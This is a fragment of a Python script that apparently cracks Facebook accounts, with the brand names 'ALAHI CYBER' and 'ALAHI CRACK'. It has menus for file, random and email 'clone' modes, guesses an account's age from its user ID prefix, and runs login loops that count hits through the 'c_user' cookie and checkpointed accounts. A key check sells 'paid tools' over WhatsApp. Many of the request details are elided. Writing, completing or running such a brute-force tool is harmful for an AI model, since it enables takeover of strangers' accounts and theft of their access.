...
try:
	...
	print(' \x1b[1;91m\x1b[1;96m\x1b[1;92m \x1b[1;96m[ALAHI-EHC')
...
def menu():
	...
	banner()
	print('\033[38;5;46m══════════════════════════════════')
	print(f'\033[38;5;46m[𝑬𝑴𝑹𝑨𝑵𝟏]𝑭𝑰𝑳𝑬 𝑪𝑳𝑶𝑵𝑬 𝑵𝑶𝑻 𝑾𝑶𝑹𝑲❌')
	print('\033[38;5;46m══════════════════════════════════')
	print(f'\033[38;5;46m[𝑬𝑴𝑹𝑨𝑵𝟐]𝑹𝑨𝑵𝑫𝑶𝑴 𝑪𝑳𝑶𝑵𝑬 𝑵𝑶𝑻 𝑾𝑶𝑹𝑲❌')
	print('\033[38;5;46m══════════════════════════════════')
	print(f'\033[38;5;46m[𝑬𝑴𝑹𝑨𝑵𝟑]𝑬𝑴𝑨𝑰𝑳 𝑪𝑳𝑶𝑵𝑬 𝑾𝑶𝑹𝑲𝑰𝑵𝑮 (𝑩𝑨𝑺𝑻✅)')
	print('\033[38;5;46m══════════════════════════════════')
	print(f'\033[38;5;46m[𝑬𝑴𝑹𝑨𝑵𝟒]𝑪𝑶𝑵𝑻𝑨𝑪𝑻 𝑴𝑬')
	print('\033[38;5;46m══════════════════════════════════')
	print(f'\033[38;5;46m[𝑬𝑴𝑹𝑨𝑵𝟓]𝑬𝑿𝑰𝑻 𝑭𝑼𝑪𝑲 𝒀𝑶𝑼 🚥')
	print('\033[38;5;46m══════════════════════════════════')
	_____ALAHI_____ = input('\033[1;92m[\033[1;34mEHC\033[1;92m]\033[0;92m𝑪𝑯𝑶𝑶𝑺𝑬✏️ :\x1b[1;92m ')
	...
	if _____ALAHI_____ in ['4']:
		os.system("xdg-open https://t.me/EHC99ALAHI ")
	if _____ALAHI_____ in ['0']:
		exit()			
def tahunng(fx):
	if len(fx)==15:
		if fx[:10] in ['1000000000']       :ALAHI = '2009'
		elif fx[:9] in ['100000000']       :ALAHI = '2009'
		elif fx[:8] in ['10000000']        :ALAHI = '2009'
		elif fx[:7] in ['1000000','1000001','1000002','1000003','1000004','1000005']:ALAHI = '2009'
		elif fx[:7] in ['1000006','1000007','1000008','1000009']:ALAHI = '2010'
		elif fx[:6] in ['100001']          :ALAHI = '2010-2011'
		elif fx[:6] in ['100002','100003'] :ALAHI = '2011-2012'
		elif fx[:6] in ['100004']          :ALAHI = '2012-2013'
		elif fx[:6] in ['100005','100006'] :ALAHI = '2013-2014'
		elif fx[:6] in ['100007','100008'] :ALAHI = '2014-2015'
		elif fx[:6] in ['100009']          :ALAHI = '2015'
		elif fx[:5] in ['10001']           :ALAHI = '2015-2016'
		elif fx[:5] in ['10002']           :ALAHI = '2016-2017'
		elif fx[:5] in ['10003']           :ALAHI = '2018'
		elif fx[:5] in ['10004']           :ALAHI = '2019'
		elif fx[:5] in ['10005']           :ALAHI = '2020'
		elif fx[:5] in ['10006','10007','10008']:ALAHI = '2021-2022'
		else:ALAHI=''
	elif len(fx) in [9,10]:
		ALAHI = '2008-2009'
	elif len(fx)==8:
...
def rcerek(uid,pwx,tl):
    ...
    'viewport-width': '980',
        	...
        	if 'c_user' in log_cookies:
        	    ...
        	    continue
        loop+=1
        brand=random.choice(['ALAHI CYBER','ALAHI-CYBER ','ALAHI CRACK '])
        ...
        sys.stdout.flush()
        sys.stdout.write('\r%s[ALAHI-EHC]\033[1;32m-%s/%s][OK-%s]\033[1;92m[CP-%s] \r'%(bi,loop,tl,len(oks),len(cps))),
        sys.stdout.flush()	
    except:
     pass
def ALAHI(uid,pwv,tl):
    ...
    'viewport-width': '980',
        ...
        sys.stdout.write(f"\r \33[1;90m[{colr}🦋⃟ᎶꫝᴍᴇᏒ✮⃝ᎬᴍRꫝɴ𝄟⃝\33[1;90m]{colo}✘\33[1;90m[{colorful}{loop}\33[1;90m/\33[1;92m{tl}\33[1;90m]-[OK:{len(oks)}\33[1;90m]-\33[1;90m[{emoji}]  "),
        sys.stdout.flush()
        sys.stdout.write(f'\r\r%s {x}[{xr}\033[38;5;46mALahi-𝗖𝗬𝗕𝗘𝗥💥{x}][%s|%s][OK:{xr}%s{x}]'%(H,loop,tl,len(oks))),
        sys.stdout.flush()
        sys.stdout.write('\r%s[ALAHI-EHC]\033[1;32m-%s/%s][OK-%s]\033[1;92m[CP-%s] \r'%(bi,loop,tl,len(oks),len(cps))),
        sys.stdout.flush()
    except:
...
def mex():
    ...
    try:
        ...
        mex()
    r = requests.get('https://github.com/Fazlaalahi/Magi/blob/main/Putki.txt').text
    if key1 in r:
        ...
        os.system('am start https://wa.me/+971056957?text=Assalamowalikom%20Sir,%20I%20Want%20To%20Buy%20Your%20ALAHI%20Paid%20Tools.%20My%20Key:%20'+key1)
        mex()
